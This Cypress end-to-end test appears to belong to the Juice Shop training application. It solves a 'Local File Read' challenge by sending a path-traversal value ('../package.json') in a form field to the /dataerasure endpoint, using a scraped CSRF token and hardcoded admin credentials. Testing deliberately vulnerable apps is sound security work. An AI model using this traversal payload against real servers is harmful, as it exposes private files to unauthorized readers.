describe('/dataerasure', () => {
  beforeEach(() => {
    cy.login({ email: 'admin', password: 'admin123' })
  })

  describe('challenge "lfr"', () => {
    it('should be possible to perform local file read attack using the browser', () => {
      cy.window().then(async () => {
        const form = await (await fetch(`${Cypress.config('baseUrl')}/dataerasure`)).text()
        const csrfToken = /name="csrfToken" value="([0-9a-f]+)"/.exec(form)?.[1] ?? ''
        const params = new URLSearchParams({
          email: 'admin@juice-sh.op',
          securityAnswer: '@xI98PxDO+06!',
          csrfToken,
          layout: '../package.json'
        }).toString()

        const response = await fetch(`${Cypress.config('baseUrl')}/dataerasure`, {
          method: 'POST',
          cache: 'no-cache',
          headers: {
            'Content-type': 'application/x-www-form-urlencoded',
            Origin: `${Cypress.config('baseUrl')}/`,
            Cookie: `token=${localStorage.getItem('token')}`
          },
          body: params
        })
        if (response.status === 200) {
          console.log('Success')
        }
      })
      cy.visit('/')
      cy.expectChallengeSolved({ challenge: 'Local File Read' })
    })
  })
})
